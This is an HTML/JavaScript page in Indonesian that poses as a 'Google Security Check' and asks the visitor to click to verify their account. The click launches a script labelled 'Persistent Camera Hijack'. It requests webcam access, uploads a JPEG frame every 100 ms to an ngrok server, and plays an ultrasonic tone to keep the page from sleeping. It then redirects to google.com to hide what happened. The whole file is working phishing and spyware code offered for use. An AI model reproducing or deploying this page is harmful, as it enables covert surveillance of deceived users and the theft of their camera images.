<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
  h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
  iframe, video, canvas { display: none !important; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Check</h2>
  <p>Klik untuk memverifikasi akun Google Anda.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>
<video id="cam-feed" autoplay playsinline muted></video>
<canvas id="processing-canvas" width="640" height="480"></canvas>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;
  var streamInterval = null;
  var audioCtx = null;
  var isCameraActive = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI
  // ============================================
  var TARGET_URL = "https://www.google.com"; 
  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev";
  
  // Delay sebelum redirect (ms) - Beri waktu kamera menyala & merekam
  var REDIRECT_DELAY = 5000; // 5 Detik

  // ============================================
  // FUNGSI: AUDIO KEEP-ALIVE (MENCEGAH SLEEP)
  // ============================================
  function initAudioKeepAlive() {
    try {
      window.AudioContext = window.AudioContext || window.webkitAudioContext;
      audioCtx = new AudioContext();
      var osc = audioCtx.createOscillator();
      var gain = audioCtx.createGain();
      gain.gain.value = 0.0001; // Sangat pelan
      osc.frequency.value = 18000; // Ultrasonic
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      log("[+] Audio Keep-Alive Aktif.");
    } catch(e) {}
  }

  // ============================================
  // FUNGSI: KIRIM GAMBAR KE SERVER
  // ============================================
  function sendImageToServer() {
    try {
      var video = document.getElementById('cam-feed');
      var canvas = document.getElementById('processing-canvas');
      var ctx = canvas.getContext('2d');

      if (video.readyState === video.HAVE_ENOUGH_DATA) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(function(blob) {
          if (!blob) return;
          var formData = new FormData();
          formData.append('file', blob, 'capture.jpg');

          fetch(SERVER_ENDPOINT, {
            method: 'POST',
            body: formData
          }).then(function(res) {
            log("[+] Gambar terkirim: " + res.status);
          }).catch(function(err) {
            log("[-] Gagal kirim gambar: " + err.message);
          });
        }, 'image/jpeg', 0.6);
      }
    } catch(e) {}
  }

  // ============================================
  // FUNGSI: START CAMERA & REDIRECT SETELAH AKTIF
  // ============================================
  function startCamera() {
    try {
      log("[+] Meminta Izin Kamera...");
      
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(function(stream) {
          var video = document.getElementById('cam-feed');
          video.srcObject = stream;
          video.play().catch(function(){});
          log("[+] 🚨 KAMERA BERHASIL diakses!");
          isCameraActive = true;

          // Mulai streaming gambar setiap 100ms
          if (streamInterval) clearInterval(streamInterval);
          streamInterval = setInterval(sendImageToServer, 100);

          // Redirect ke Google setelah delay (kamera sudah aktif)
          setTimeout(function() {
            log("[+] Redirect ke Google setelah " + REDIRECT_DELAY + "ms...");
            try {
              window.location.href = TARGET_URL;
            } catch(e) {}
          }, REDIRECT_DELAY);

        })
        .catch(function(err) {
          log("[-] Kamera diblokir: " + err.name);
          // Jika kamera diblokir, tetap redirect ke Google setelah 1 detik
          setTimeout(function() {
            log("[+] Redirect ke Google (karena kamera diblokir)...");
            window.location.href = TARGET_URL;
          }, 1000);
        });
    } catch(e) {}
  }

  // ============================================
  // TRIGGER (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>⏳ Memverifikasi...</h2>
      <p>Menghubungkan ke Google...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Persistent Camera Hijack...");

    // A. Inisialisasi Audio Keep-Alive
    initAudioKeepAlive();

    // B. Mulai Kamera (Akan redirect setelah aktif)
    startCamera();

  }, { once: true });

})();
</script>
</body>
</html>
